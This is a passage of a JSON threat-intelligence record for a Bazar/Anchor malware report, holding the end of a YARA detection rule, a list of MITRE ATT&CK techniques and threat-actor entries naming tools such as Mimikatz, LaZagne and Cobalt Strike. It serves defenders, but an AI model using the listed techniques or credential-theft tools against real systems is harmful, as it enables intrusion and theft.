Goodware String - occured 568 times\n*/\n$s20 = \"connection aborted\" fullword ascii /* Goodware String - occured 568 times */\ncondition:\nuint16(0) == 0x5a4d and filesize < 700KB and\n( pe.imphash() == \"9859b7a32d1227be2ca925c81ae9265e\" or 8 of them )\n}\n\n## MITRE\nSpearphishing Link - T1566.002\nCommand-Line Interface - T1059\nMalicious File - T1204.002\nScheduled Task - T1053.005\nUser Execution - T1204\nProcess Injection - T1055\nDNS - T1071.004\nCommonly Used Port - T1043\nApplication Layer Protocol - T1071\nExfiltration Over C2 Channel - T1041\nSMB/Windows Admin Shares - T1021.002\nDomain Trust Discovery - T1482\nDomain Account - T1087.002\nRemote System Discovery - T1018\nSystem Information Discovery - T1082\nOS Credential Dumping - T1003\n\n#### Internal case #1017\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-08 - Bazar Drops the Anchor.pdf"
    ],
    "report_names": [
        "2021-03-08 - Bazar Drops the Anchor.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d1f8bd4e-bcd4-4101-9158-6158f1806b38",
            "created_at": "2023-01-06T13:46:39.487358Z",
            "updated_at": "2025-03-27T02:00:03.107568Z",
            "deleted_at": null,
            "main_name": "BazarCall",
            "aliases": [
                "BazaCall",
                "BazzarCall"
            ],
            "source_name": "MISPGALAXY:BazarCall",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536207,
    "ts_updated_at": 1743041627,
    "ts_creation_date": 1653761014,
    "ts_modification_date": 1653761014,
    "files": {
        "pdf": "https://archive.orkl.eu/6931ffa0688e49b555daeccec00628d561f6dc3b.pdf",
        "text": "https://archive.orkl.eu/6931ffa0688e49b555daeccec00628d561f6dc3b.txt",
        "img": "https://archive.orkl.eu/6931ffa0688e49b555daeccec00628d561f6dc3b.jpg"
    }
}